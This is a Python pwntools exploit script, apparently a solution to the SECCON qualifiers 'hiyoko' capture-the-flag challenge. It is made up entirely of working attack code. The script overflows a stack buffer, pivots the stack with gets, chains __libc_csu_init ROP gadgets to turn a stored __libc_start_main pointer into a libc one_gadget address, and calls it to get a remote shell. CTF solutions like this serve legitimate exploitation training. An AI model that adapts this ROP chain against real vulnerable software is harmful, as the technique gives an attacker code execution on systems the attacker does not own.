from pwn import *

# p = process('./chall')
p = remote('hiyoko.quals.seccon.jp', 9002)
# p = remote('localhost', 7777)
e = ELF('./chall')
libc = ELF('./libc-2.31.so')

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]

writable = 0x404000
got = 0x403ff0

pop_rdi = 0x004011c3
pop_rbp = 0x0040111d
pop_r14_r15 = 0x004011c0
pop_rsp_r13_r14_r15 = 0x004011bd
add_rbp_ebx = 0x0040111c
csu_pop = 0x4011ba
csu_call = 0x4011a0
csu_push = 0x00401172

offset = one_gadget[2] - libc.symbols['__libc_start_main']

# 1st (Stack pivot)
payload = b'A' * 0x88
payload += p64(pop_rdi)
payload += p64(writable)
payload += p64(e.plt['gets'])
payload += p64(pop_rsp_r13_r14_r15)
payload += p64(got)

p.sendline(payload)

# 2nd 
# increase rsp 
payload = b'A' * 0x8
payload += p64(pop_r14_r15)
payload += p64(0x403dd8) * 2    # bypass __libc_csu_init+53
payload += p64(pop_r14_r15)
payload += p64(0x403dd8) * 2    # bypass __libc_csu_init+53

# put libc addr into bss
payload += p64(csu_push)

# __libc_start_main -> one gadget
# __libc_start_main addr is located at writable+0x38
payload += b'A' * 0x8 * 2
payload += p64(csu_pop)
payload += p64(offset)                  # rbx
payload += p64(writable + 0x38 + 0x3d)  # rbp
payload += b'A' * 0x8 * 4
payload += p64(add_rbp_ebx)

# call [r15]
payload += p64(csu_pop)
payload += p64(0)                   # rbx
payload += p64(1)                   # rbp
payload += p64(0) * 3
payload += p64(writable + 0x38)     # r15
payload += p64(csu_call)

p.sendline(payload)
p.interactive()
